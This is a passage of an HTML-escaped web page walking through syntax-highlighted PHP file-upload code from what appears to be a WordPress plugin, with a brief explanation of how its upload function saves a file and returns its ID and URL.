class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$file&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$base64&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$filename&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$purpose&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;files&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$ttl&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;mi&#34;&gt;3600&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$target&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$metadata&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;[]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;...&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;try&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;empty&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$base64&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;...&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;empty&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$file&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;is_array&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$file&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;c1&#34;&gt;//&amp;ensp;Handle&amp;ensp;regular&amp;ensp;file&amp;ensp;upload&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;empty&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$file&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;error&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;throw&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;new&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;Exception&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;File&amp;ensp;upload&amp;ensp;error:&amp;ensp;&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$file&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;error&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line hl&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$refId&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;core&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;files&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;upload_file&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$file&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;tmp_name&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$file&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;name&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$purpose&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$metadata&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;c1&#34;&gt;//&amp;ensp;envId&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$target&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$ttl&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$url&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;core&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;files&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;get_url&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$refId&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;id&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$refId&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;url&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$url&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;throw&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;new&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;Exception&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;Either&amp;ensp;a&amp;ensp;file&amp;ensp;or&amp;ensp;base64&amp;ensp;data&amp;ensp;must&amp;ensp;be&amp;ensp;provided.&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;catch&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;Exception&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$e&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;throw&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;new&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;Exception&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;File&amp;ensp;upload&amp;ensp;failed:&amp;ensp;&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$e&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getMessage&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The &lt;code&gt;simpleFileUpload()&lt;/code&gt; function performs an upload from either file or base64 data.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;If &lt;code&gt;$base64&lt;/code&gt; is not empty → handle upload from base64.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;If &lt;code&gt;$file&lt;/code&gt; is a valid array:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Check upload error (&lt;code&gt;$file[&#39;error&#39;]&lt;/code&gt;) → throw Exception if present.&lt;/li&gt;&#xA;&lt;li&gt;Call &lt;code&gt;$this-&amp;gt;core-&amp;gt;files-&amp;gt;upload_file()&lt;/code&gt; to save the file.&lt;/li&gt;&#xA;&lt;li&gt;Get the file URL via &lt;code&gt;$this-&amp;gt;core-&amp;gt;files-&amp;gt;get_url($refId)&lt;/code&gt; and return an array &lt;code&gt;[&#39;id&#39;&amp;ensp;=&amp;gt;&amp;ensp;$refId,&amp;ensp;&#39;url&#39;&amp;ensp;=&amp;gt;&amp;ensp;$url]&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;public&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;function&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nf&#34;&gt;upload_file&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$path&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$filename&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$purpose&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$metadata&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$envId&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$target&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$expiry&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;require_once&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;ABSPATH&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;wp-admin/includes/image.php&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;require_once&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;ABSPATH&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;wp-admin/includes/file.php&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;require_once&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;ABSPATH&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;wp-admin/includes/media.php&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$target&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;empty&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$target&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;?&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;core&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;get_option&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;image_local_upload&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$target&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$expiry&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;empty&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$expiry&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;?&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;core&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;get_option&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;image_expires&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$expiry&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$expires&lt;/span&gt;&amp;ensp;&lt;span 